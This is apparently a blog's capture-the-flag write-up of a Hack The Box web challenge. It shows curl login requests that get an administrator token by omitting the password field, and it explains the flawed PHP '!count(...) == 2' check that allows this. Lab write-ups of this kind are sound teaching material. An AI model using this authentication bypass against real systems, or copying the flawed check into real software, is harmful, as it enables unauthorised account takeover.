@@ -1,0 +1,187 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2025-05-05 Mon 21:34 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Insomnia</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">Insomnia</h1>
+<p>
+I'm greeted with a website that has multiple pages, such as <code>Home</code>, <code>Sign In</code> and
+<code>Sign Up</code>. So I guess I can create an account and login. I'll start by creating account:
+</p>
+
+
+<div id="orgc8ea031" class="figure">
+<p><img src="writeup-img/2025-01-07_21-19-08_screenshot.png" alt="2025-01-07_21-19-08_screenshot.png" />
+</p>
+</div>
+
+
+<p>
+And now I can login:
+</p>
+
+
+
+<div id="org17e600a" class="figure">
+<p><img src="writeup-img/2025-01-07_21-19-44_screenshot.png" alt="2025-01-07_21-19-44_screenshot.png" />
+</p>
+</div>
+
+<p>
+Nothing interesting, very underwhelming! Hopefully, the downloaded files can
+show us something more. Right at the start, I can see that the web application
+was made using <code>CodeIgniter</code>, which uses <code>PHP</code>. The logic of each page resides in
+the controllers. The <code>ProfileController.php</code> seems to be the one that has the
+logic of the page that is shown after a user logs in. It is also the one that
+reads the flag and prints it out! But I have to be the user called
+<code>administrator</code>, and I feel it's same to assume that that user already exists.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">if ($username == "administrator") {
+    return view("ProfilePage", [
+      "username" =&gt; $username,
+      "content" =&gt; $flag,
+    ]);
+}
+</pre>
+</div>
+
+<p>
+The <code>UserController.php</code> has the logic for the login page and the <code>login</code> function
+has some error handling and whatever. This is when I think it's best to get the
+login request and mess around with it. If I login successfully, I get an access token:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl <span class="org-string">'http://94.237.51.26:52223/index.php/login'</span> -X POST -H <span class="org-string">'Content-Type: application/json'</span> --data-raw <span class="org-string">'{"username":"AsmArtisan256","password":"XXXX"}'</span>
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-js">{<span class="org-string">"message"</span>:<span class="org-string">"Login Succesful"</span>,<span class="org-string">"token"</span>:<span class="org-string">"XXXX"</span>}
+</pre>
+</div>
+
+<p>
+If I use an empty password, it tells me that the user wasn't found:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl <span class="org-string">'http://94.237.51.26:52223/index.php/login'</span> -X POST -H <span class="org-string">'Content-Type: application/json'</span> --data-raw <span class="org-string">'{"username":"AsmArtisan256","password":""}'</span>
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-nil">User not found
+</pre>
+</div>
+
+<p>
+Then I tried adding a parameter, just to test it out, but now there isn't even output:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl <span class="org-string">'http://94.237.51.26:52223/index.php/login'</span> -X POST -H <span class="org-string">'Content-Type: application/json'</span> --data-raw <span class="org-string">'{"username":"AsmArtisan256","password":"XXXX","test":"test"}'</span>
+</pre>
+</div>
+
+<p>
+Until I tested the scenario of just sending the username:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl <span class="org-string">'http://94.237.51.26:52223/index.php/login'</span> -X POST -H <span class="org-string">'Content-Type: application/json'</span> --data-raw <span class="org-string">'{"username":"AsmArtisan256"}'</span>
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-js">{<span class="org-string">"message"</span>:<span class="org-string">"Login Succesful"</span>, <span class="org-string">"token"</span>:<span class="org-string">"XXXX"</span>}
+</pre>
+</div>
+
+<p>
+Ok, wait a second, I just sent the username and it still gave me an access
+token? I guess I can just change the username to <code>administrator</code> and get that
+user's access token right? Yep.
+</p>
+
+<p>
+Although I found this just by chance, what actually happened? The
+<code>UserController.php</code> file has the <code>login</code> function that executes the previous
+request. It starts by connecting to the database, getting the JSON body,
+verifying if it has username and password and so on:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">public function login()
+{
+    $db = db_connect();
+    $json_data = request()-&gt;getJSON(true);
+    if (!count($json_data) == 2) {
+        return $this-&gt;respond("Please provide username and password", 404);
+    }
+    $query = $db-&gt;table("users")-&gt;getWhere($json_data, 1, 0);
+    $result = $query-&gt;getRowArray();
+
+    ................
+}
+</pre>
+</div>
+
+<p>
+The <code>if</code> statement that verifies the number of parameters in the <code>JSON</code> body messed
+up, for some reason, and thought that only one parameter was valid enough to
+continue through the database logic. But the exclamation point before the
+function call makes all the difference:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">$c[0] = 1;
+var_dump(count($c));
+
+// =&gt; int(1)
+
+$c[0] = 1;
+var_dump(!count($c));
+
+// =&gt; bool(false)
+</pre>
+</div>
+
+<p>
+So, according to the code above, <code>false == 2</code> is always a false statement,
+enabling us the possibility of logging in with just the username and getting the
+flag by using the resulting access token!
+</p>
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">07-01-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+</div>
+</body>
+</html>
